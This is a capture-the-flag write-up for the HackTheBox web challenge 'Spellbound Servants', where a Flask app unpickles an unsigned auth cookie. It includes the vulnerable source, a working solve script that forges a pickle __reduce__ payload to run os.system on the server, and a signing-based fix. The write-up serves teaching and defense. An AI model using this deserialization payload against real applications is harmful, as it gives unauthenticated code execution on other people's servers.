---
layout: post
title: "Spellbound Servants"
date: 2027-07-08 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, deserialization, pickle, flask, cwe-502, python, rce]
---

## Overview

Spellbound Servants is an HTB Web challenge (Easy) centered on a single Flask app that stores session state as an unsigned, unauthenticated pickle cookie. Because there is no HMAC or signature check before deserialization, any visitor can forge a cookie containing a `__reduce__` payload and achieve pre-authentication [insecure deserialization](https://cwe.mitre.org/data/definitions/502.html) RCE in two HTTP requests.

---

## The Technique

### Source review

The vulnerability lives in the `isAuthenticated` decorator in `application/util.py`. On login the user dict is pickled and base64-encoded directly into an `auth` cookie; on every subsequent request the decorator decodes and deserializes it with no integrity check:

```python
# database.py — login encodes the user dict as a bare pickle
pickled_data = base64.b64encode(pickle.dumps(user))
res.set_cookie('auth', pickled_data.decode("ascii"))

# util.py — isAuthenticated deserializes the cookie with NO HMAC or signature check
def isAuthenticated(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        token = request.cookies.get('auth', False)
        user = pickle.loads(base64.urlsafe_b64decode(token))   # CWE-502: attacker-controlled bytes
        kwargs['user'] = user
        return f(*args, **kwargs)
    return decorator
```

`pickle.loads()` on attacker-controlled bytes is unconditional code execution: Python's pickle protocol calls the `(callable, args)` pair returned by `__reduce__` at load time, before any application logic runs. Because deserialization happens *inside* the auth check itself, the exploit is **pre-authentication** — no credentials needed.

### Why copy-to-static?

The protected `/home` route renders `{{ user.username }}` in the template. If `__reduce__` returns `os.system(...)`, the result is an integer (`0` on success), and `user.username` raises `AttributeError` — the RCE fires but the response is an error page. The cleaner path: have the payload copy the flag into the Flask static directory, then fetch it over plain HTTP without any auth.

---

## Solution

`solve.py` takes the target URL, forges the pickle cookie, triggers deserialization on `GET /home`, then reads the flag from `/static/flag.txt`:

```python
#!/usr/bin/env python3
import pickle, base64, os, requests, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://<host>:<port>"

class CopyFlag:
    def __reduce__(self):
        return (os.system, ("cp /flag.txt /app/application/static/flag.txt",))

payload = base64.urlsafe_b64encode(pickle.dumps(CopyFlag()))

r = requests.get(f"{TARGET}/home", cookies={"auth": payload.decode()}, allow_redirects=False)
print(f"[*] /home response: {r.status_code}")

r2 = requests.get(f"{TARGET}/static/flag.txt")
if r2.ok:
    print(f"[+] FLAG: {r2.text.strip()}")
```

Run it:

```bash
python3 solve.py http://<host>:<port>
# [*] /home response: 200
# [+] FLAG: HTB{...}
```

The flag is `HTB{...}`.

---

## Why it worked

The app treats the `auth` cookie as trusted session state because it was originally written by the server at login — but it encodes with `base64.b64encode` and decodes with `base64.urlsafe_b64decode`, with no signature between the two operations. Any client that submits a cookie of the right shape bypasses authentication entirely. The `urlsafe_b64encode` call in the exploit matches the `urlsafe_b64decode` the server uses, so the forged bytes arrive intact and `pickle.loads` runs them without complaint.

This is [CWE-502 — Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html): the application deserializes data from an untrusted source (the cookie) without verifying its integrity first.

---

## Fix / Defense

Sign session cookies with `itsdangerous.URLSafeSerializer` — Flask's own session implementation already does this, so switching to `flask.session` is the lowest-effort fix. Alternatively, store only an opaque session ID in the cookie and look up the user object server-side.

```python
from itsdangerous import URLSafeSerializer

_s = URLSafeSerializer(app.secret_key, salt="auth")

def pack_auth(user):   return _s.dumps(user)
def unpack_auth(token): return _s.loads(token)  # raises BadSignature if tampered
```

Never call `pickle.loads()` on data that crosses a trust boundary. If a binary serialization format is required, apply an HMAC over the ciphertext and verify it before deserializing.
